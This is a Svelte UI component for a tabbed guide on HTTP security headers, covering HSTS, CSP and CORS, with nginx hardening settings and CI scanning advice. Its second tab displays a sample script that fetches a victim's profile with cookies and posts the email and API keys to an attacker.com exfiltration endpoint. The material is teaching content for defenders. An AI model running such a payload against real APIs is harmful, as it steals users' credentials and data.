<script lang="ts">
  import * as m from "$lib/paraglide/messages";
  import {
    X,
    ShieldAlert,
    GraduationCap,
    Globe,
    Code2,
    Server,
    Key,
    AlertTriangle,
    ArrowRight,
    ChevronRight,
    ChevronLeft,
  } from "lucide-svelte";
  import { fade, fly } from "svelte/transition";
  import { backOut } from "svelte/easing";

  let { isOpen = $bindable(false) } = $props<{ isOpen: boolean }>();

  function close() {
    isOpen = false;
  }

  let activeTab = $state(0);
  const tabs = [
    { id: 0, label: "1. Surface Mapping", icon: Globe },
    { id: 1, label: "2. Exploitation Vectors", icon: AlertTriangle },
    { id: 2, label: "3. DevSecOps", icon: ShieldAlert },
  ];

  function nextTab() {
    if (activeTab < tabs.length - 1) activeTab++;
  }
  function prevTab() {
    if (activeTab > 0) activeTab--;
  }
</script>

{#if isOpen}
  <!-- svelte-ignore a11y_click_events_have_key_events, a11y_no_static_element_interactions -->
  <div
    class="fixed inset-0 z-60 flex items-center justify-center p-4 sm:p-6 bg-black/80 backdrop-blur-md"
    transition:fade={{ duration: 200 }}
    onclick={close}
  >
    <div
      class="bg-[#0A0C10] border border-orange-500/20 rounded-2xl w-full max-w-4xl overflow-hidden shadow-[0_0_50px_-12px_rgba(249,115,22,0.15)] relative flex flex-col max-h-[90vh]"
      transition:fly={{ y: 20, duration: 400, easing: backOut }}
      onclick={(e) => e.stopPropagation()}
    >
      <!-- Header Area -->
      <div
        class="relative bg-linear-to-r from-orange-950/40 via-red-900/10 to-transparent p-6 border-b border-orange-500/10 shrink-0"
      >
        <div
          class="absolute -right-20 -top-20 w-64 h-64 bg-orange-500/10 blur-3xl rounded-full pointer-events-none"
        ></div>
        <button
          onclick={close}
          class="absolute top-4 right-4 p-2 text-muted hover:text-primary-text bg-white/5 hover:bg-orange-500/20 rounded-xl transition-all border border-white/5 hover:border-orange-500/30 font-medium"
          aria-label="Close guide modal"
        >
          <X size={18} />
        </button>

        <div
          class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 relative z-10"
        >
          <div class="flex items-center gap-4">
            <div
              class="w-14 h-14 rounded-2xl bg-linear-to-br from-orange-500/20 to-red-600/10 flex items-center justify-center border border-orange-500/30 shadow-inner"
            >
              <GraduationCap size={28} class="text-orange-400" />
            </div>
            <div>
              <h2 class="text-2xl font-bold tracking-tight text-primary-text">
                {m.sec_posture_title
                  ? m.sec_posture_title()
                  : "Security Posture & Headers"}
              </h2>
              <p class="text-sm text-muted mt-1 max-w-md">
                Attack Surface Mapping & Misconfiguration Discovery.
              </p>
            </div>
          </div>

          <!-- Tab Navigation -->
          <div
            class="flex bg-black/40 p-1 rounded-lg border border-white/5 mt-4 sm:mt-0"
          >
            {#each tabs as tab (tab.id)}
              <button
                onclick={() => (activeTab = tab.id)}
                class="flex items-center gap-2 px-3 py-1.5 rounded-md text-sm font-medium transition-all {activeTab ===
                tab.id
                  ? 'bg-orange-500/20 text-orange-300 border border-orange-500/20 shadow-sm'
                  : 'text-muted hover:text-primary-text hover:bg-white/5 border border-transparent'}"
              >
                <tab.icon size={14} />
                <span class="hidden sm:inline">{tab.label}</span>
              </button>
            {/each}
          </div>
        </div>
      </div>

      <!-- Content Area - Scrollable -->
      <div class="flex-1 overflow-y-auto p-6 relative">
        {#if activeTab === 0}
          <div transition:fade={{ duration: 200 }}>
            <h3 class="text-lg font-semibold text-orange-300 mb-4">
              Understanding the Attack Surface
            </h3>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
              <div class="space-y-4">
                <p class="text-primary-text text-sm leading-relaxed">
                  The "overall grade" calculated during reconnaissance acts as
                  an indicator of your DevSecOps maturity. If basic headers are
                  missing, attackers assume the underlying application logic is
                  equally flawed.
                </p>
                <div
                  class="bg-orange-950/20 border border-orange-500/10 rounded-xl p-4"
                >
                  <h4
                    class="text-orange-400 font-medium mb-3 flex items-center gap-2"
                  >
                    <Globe size={16} /> Essential Defense Layers
                  </h4>
                  <ul class="space-y-3 text-sm text-muted">
                    <li class="flex items-start gap-2">
                      <ArrowRight
                        size={14}
                        class="text-orange-500 mt-1 shrink-0"
                      />
                      <span
                        ><strong>HSTS (Strict-Transport-Security):</strong> Forces
                        browsers to interact strictly over HTTPS, preventing SSL
                        Stripping / MitM.</span
                      >
                    </li>
                    <li class="flex items-start gap-2">
                      <ArrowRight
                        size={14}
                        class="text-orange-500 mt-1 shrink-0"
                      />
                      <span
                        ><strong>CSP (Content-Security-Policy):</strong> Mitigates
                        XSS by dictating exactly which domains can load scripts,
                        frames, and styles.</span
                      >
                    </li>
                    <li class="flex items-start gap-2">
                      <ArrowRight
                        size={14}
                        class="text-orange-500 mt-1 shrink-0"
                      />
                      <span
                        ><strong>CORS Profiles:</strong> A wildcard
                        <code>*</code> in `Access-Control-Allow-Origin` lets malicious
                        sites read data meant only for the user.</span
                      >
                    </li>
                  </ul>
                </div>
              </div>

              <!-- Visual Diagram -->
              <div
                class="bg-black/50 border border-white/5 rounded-xl p-6 flex flex-col items-center justify-center relative shadow-inner h-full overflow-hidden"
              >
                <div
                  class="absolute right-0 top-0 w-32 h-32 bg-orange-500/5 rounded-bl-full"
                ></div>

                <div class="w-full space-y-3 relative z-10">
                  <div
                    class="bg-emerald-950/30 border border-emerald-500/30 p-3 rounded-lg flex items-center justify-between"
                  >
                    <div class="flex items-center gap-2">
                      <ShieldAlert size={16} class="text-emerald-400" />
                      <span
                        class="text-emerald-300 text-sm font-mono tracking-tight"
                        >Strict-Transport-Security</span
                      >
                    </div>
                    <span class="text-emerald-500/50 text-xs">Active</span>
                  </div>

                  <div
                    class="bg-red-950/30 border border-red-500/30 p-3 rounded-lg flex items-center justify-between relative overflow-hidden group"
                  >
                    <div class="flex items-center gap-2">
                      <AlertTriangle size={16} class="text-red-400" />
                      <span
                        class="text-red-300 text-sm font-mono tracking-tight"
                        >Content-Security-Policy</span
                      >
                    </div>
                    <span class="text-red-500/50 text-xs font-bold"
                      >MISSING</span
                    >

                    <!-- XSS Payload Injection Animation -->
                    <div
                      class="absolute right-0 top-0 h-full w-0 group-hover:w-full bg-linear-to-r from-transparent to-red-500/20 transition-all duration-1000 ease-in flex items-center justify-end pr-4"
                    >
                      <span class="font-mono text-red-400 text-[10px]"
                        >&lt;script&gt;steal()&lt;/script&gt;</span
                      >
                    </div>
                  </div>

                  <div
                    class="bg-orange-950/30 border border-orange-500/30 p-3 rounded-lg flex items-center justify-between"
                  >
                    <div class="flex items-center gap-2">
                      <Server size={16} class="text-orange-400" />
                      <span
                        class="text-orange-300 text-sm font-mono tracking-tight"
                        >Server</span
                      >
                    </div>
                    <span
                      class="text-orange-500 text-xs font-bold bg-orange-500/10 px-2 py-0.5 rounded"
                      >Apache/2.4.41</span
                    >
                  </div>
                </div>

                <div
                  class="text-center text-xs text-orange-400 mt-6 bg-orange-500/10 px-4 py-2 rounded-full border border-orange-500/30 font-medium tracking-wide"
                >
                  Headers dictate the browser's security boundaries
                </div>
              </div>
            </div>
          </div>
        {:else if activeTab === 1}
          <div transition:fade={{ duration: 200 }}>
            <div class="flex items-center gap-3 mb-4">
              <h3 class="text-lg font-semibold text-orange-300">
                Exploiting Misconfigurations
              </h3>
            </div>
            <p class="text-sm text-muted mb-6 max-w-3xl">
              When security headers are absent, attackers leverage the browser
              itself as the weapon. A missing CSP header means any injected
              HTML/JS will execute seamlessly.
            </p>

            <!-- Terminal Mockup -->
            <div
              class="bg-[#0d1117] rounded-xl border border-orange-500/10 shadow-2xl overflow-hidden font-mono text-xs sm:text-sm "
            >
              <div
                class="bg-surface/80 px-4 py-3 flex items-center gap-2 border-b border-white/5 backdrop-blur"
              >
                <div class="w-3 h-3 rounded-full bg-red-500/80"></div>
                <div class="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                <div class="w-3 h-3 rounded-full bg-green-500/80"></div>
                <span class="ml-2 text-muted text-xs tracking-wider"
                  >attacker.com/exploit.html</span
                >
              </div>
              <div
                class="p-5 space-y-3 text-primary-text h-72 overflow-y-auto custom-scrollbar"
              >
                <p class="text-muted italic">
                  // Scenario: Target API has CORS configured with
                  Access-Control-Allow-Origin: *
                </p>
                <p class="text-muted italic">
                  // and allows credentials. The attacker crafts this payload on
                  their own domain:
                </p>

                <div class="mt-4">
                  <pre
                    class="text-emerald-300 bg-black/60 p-4 rounded-xl border border-white/5 shadow-inner">
&lt;<span class="text-pink-400">script</span>&gt;
  <span class="text-blue-400">fetch</span>(<span class="text-orange-300"
                      >'https://api.target.com/v1/user/profile'</span
                    >, &#123;
    <span class="text-purple-400">method</span>: <span class="text-orange-300"
                      >'GET'</span
                    >,
    <span class="text-purple-400">credentials</span>: <span
                      class="text-orange-300">'include'</span
                    > <span class="text-muted italic"
                      >// Sends victim's cookies automatically</span
                    >
  &#125;)
  .<span class="text-blue-400">then</span>(res =&gt; res.<span
                      class="text-blue-400">json</span
                    >())
  .<span class="text-blue-400">then</span>(data =&gt; &#123;
    <span class="text-muted italic"
                      >// Exfiltrate sensitive data to attacker server</span
                    >
    <span class="text-blue-400">fetch</span>(<span class="text-orange-300"
                      >'https://attacker.com/exfil'</span
                    >, &#123;
      <span class="text-purple-400">method</span>: <span class="text-orange-300"
                      >'POST'</span
                    >,
      <span class="text-purple-400">body</span>: JSON.<span
                      class="text-blue-400">stringify</span
                    >(&#123; email: data.email, keys: data.api_keys &#125;)
    &#125;);
  &#125;);
&lt;/<span class="text-pink-400">script</span>&gt;</pre>
                </div>
                <p class="text-red-400 font-bold mt-4 flex items-center gap-2">
                  <AlertTriangle size={16} /> Result: The browser successfully performs
                  cross-origin data theft because the target server permitted it
                  globally.
                </p>
              </div>
            </div>
          </div>
        {:else if activeTab === 2}
          <div transition:fade={{ duration: 200 }}>
            <h3 class="text-lg font-semibold text-emerald-400 mb-4">
              DevSecOps Standard Practices
            </h3>
            <p class="text-sm text-muted mb-6 max-w-3xl">
              Inject headers at your reverse proxy (Nginx/Traefik) or directly
              inside your application framework middleware. Scan pipelines for
              regressions.
            </p>

            <!-- Code Example -->
            <div
              class="relative bg-[#0d1117] rounded-xl border border-emerald-500/30 shadow-[0_0_30px_rgba(16,185,129,0.1)] overflow-hidden font-mono text-sm mb-6"
            >
              <div
                class="absolute top-0 right-0 bg-emerald-500/10 text-emerald-400 px-4 py-1.5 rounded-bl-xl text-xs font-bold border-b border-l border-emerald-500/30 tracking-widest uppercase"
              >
                NGINX Hardening
              </div>
              <div class="p-6 overflow-x-auto pt-10 custom-scrollbar">
                <pre class="text-primary-text leading-relaxed">
<span class="text-muted italic"
                    ># 1. Enforce HTTPS only (HSTS) with max-age of 1 year</span
                  >
<span class="text-purple-400">add_header</span> <span class="text-green-300"
                    >Strict-Transport-Security</span
                  > <span class="text-blue-300"
                    >"max-age=31536000; includeSubDomains; preload"</span
                  > <span class="text-orange-300">always</span>;

<span class="text-muted italic"
                    ># 2. Prevent Clickjacking (framing context)</span
                  >
<span class="text-purple-400">add_header</span> <span class="text-green-300"
                    >X-Frame-Options</span
                  > <span class="text-blue-300">"SAMEORIGIN"</span> <span
                    class="text-orange-300">always</span
                  >;

<span class="text-muted italic"
                    ># 3. Disable MIME-sniffing (protects from malicious file uploads bypassing filters)</span
                  >
<span class="text-purple-400">add_header</span> <span class="text-green-300"
                    >X-Content-Type-Options</span
                  > <span class="text-blue-300">"nosniff"</span> <span
                    class="text-orange-300">always</span
                  >;

<span class="text-muted italic"
                    ># 4. Strict Content-Security-Policy (Blocks external scripts/eval)</span
                  >
<span class="text-purple-400">add_header</span> <span class="text-green-300"
                    >Content-Security-Policy</span
                  > <span class="text-blue-300"
                    >"default-src 'self'; script-src 'self'; object-src 'none';"</span
                  > <span class="text-orange-300">always</span>;

<span class="text-muted italic"># 5. Remove server identity</span>
<span class="text-purple-400">server_tokens</span> <span class="text-red-400"
                    >off</span
                  >;</pre>
              </div>
            </div>

            <!-- Mitigation Checklist -->
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div
                class="bg-emerald-950/10 border border-emerald-500/20 rounded-xl p-5 flex gap-4 hover:border-emerald-500/40 transition-colors"
              >
                <div class="bg-emerald-500/10 p-2 rounded-lg h-fit">
                  <Code2 size={20} class="text-emerald-400 shrink-0" />
                </div>
                <div>
                  <h4 class="text-sm font-semibold text-emerald-300 mb-1.5">
                    Validate CORS Dynamically
                  </h4>
                  <p class="text-xs text-emerald-200/70 leading-relaxed">
                    Instead of using wildcards in Node/Rust/Python, dynamically
                    validate the `Origin` header against an explicit array of
                    whitelisted domains.
                  </p>
                </div>
              </div>
              <div
                class="bg-blue-950/10 border border-blue-500/20 rounded-xl p-5 flex gap-4 hover:border-blue-500/40 transition-colors"
              >
                <div class="bg-blue-500/10 p-2 rounded-lg h-fit">
                  <ShieldAlert size={20} class="text-blue-400 shrink-0" />
                </div>
                <div>
                  <h4 class="text-sm font-semibold text-blue-300 mb-1.5">
                    DAST Scanning in CI/CD
                  </h4>
                  <p class="text-xs text-blue-200/70 leading-relaxed">
                    Integrate OWASP ZAP or Nuclei into GitHub actions to fail
                    the PR build if a required security header is accidentally
                    stripped.
                  </p>
                </div>
              </div>
            </div>
          </div>
        {/if}
      </div>

      <!-- Footer Area -->
      <div
        class="bg-[#0A0C10] p-4 border-t border-orange-500/10 flex items-center justify-between shrink-0 shadow-[0_-10px_20px_-10px_rgba(0,0,0,0.5)] z-20"
      >
        <div class="text-xs text-muted hidden sm:block">
          Use <kbd
            class="px-2 py-1 bg-white/5 rounded mx-1 text-muted border border-white/10 font-mono"
            >Esc</kbd
          > or click outside to dismiss
        </div>
        <div
          class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end"
        >
          {#if activeTab > 0}
            <button
              onclick={prevTab}
              class="flex items-center gap-1.5 px-5 py-2.5 bg-white/5 hover:bg-white/10 text-primary-text text-sm font-medium rounded-xl border border-white/5 hover:border-white/10 transition-all focus:ring-2 focus:ring-white/10 outline-none"
            >
              <ChevronLeft size={16} /> Previous
            </button>
          {:else}
            <div></div>
          {/if}

          {#if activeTab < tabs.length - 1}
            <button
              onclick={nextTab}
              class="flex items-center gap-1.5 px-6 py-2.5 bg-orange-600 hover:bg-orange-500 text-primary-text text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-orange-500/50 outline-none"
            >
              Continue <ChevronRight size={16} />
            </button>
          {:else}
            <button
              onclick={close}
              class="flex items-center gap-1.5 px-8 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-emerald-950 text-sm font-bold rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-emerald-500/50 outline-none"
            >
              Complete
            </button>
          {/if}
        </div>
      </div>
    </div>
  </div>
{/if}

<style>
  .custom-scrollbar::-webkit-scrollbar {
    width: 8px;
    height: 8px;
  }
  .custom-scrollbar::-webkit-scrollbar-track {
    background: transparent;
  }
  .custom-scrollbar::-webkit-scrollbar-thumb {
    background-color: rgba(255, 255, 255, 0.1);
    border-radius: 10px;
  }
  .custom-scrollbar::-webkit-scrollbar-thumb:hover {
    background-color: rgba(255, 255, 255, 0.2);
  }
</style>
